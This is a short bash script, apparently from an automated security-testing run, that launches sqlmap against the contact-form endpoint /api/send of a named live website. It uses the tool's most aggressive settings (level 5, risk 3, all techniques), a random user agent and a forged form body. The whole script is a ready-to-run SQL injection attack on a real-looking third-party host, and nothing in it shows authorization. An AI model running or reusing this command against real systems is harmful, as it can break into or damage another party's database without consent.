#!/bin/bash
# Required sqlmap run: POST /api/send (all discovered params)
cd "$WORK_PATH"
OUT=tool_outputs/w40_sqlmap_send
mkdir -p $OUT
sqlmap \
  -u "https://www.infinitycapital.bh/api/send" \
  --data="fname=sqlmapProbe&lname=Security&areacode=973&tel=5551234&cname=QA+Tester&subject=Hello+there&msg=Testing+message+body&check=on&targets=probe@relay.invalid" \
  --batch --level=5 --risk=3 --dbms= --string='"error":null' \
  --delay=5 --timeout=20 --retries=1 --threads=1 \
  --technique=BEUSTQ --time-sec=8 \
  --random-agent --output-dir=$OUT \
  --flush-session \
  2>&1 | tail -120
echo "SQLMAP_SEND_EXIT=$?"
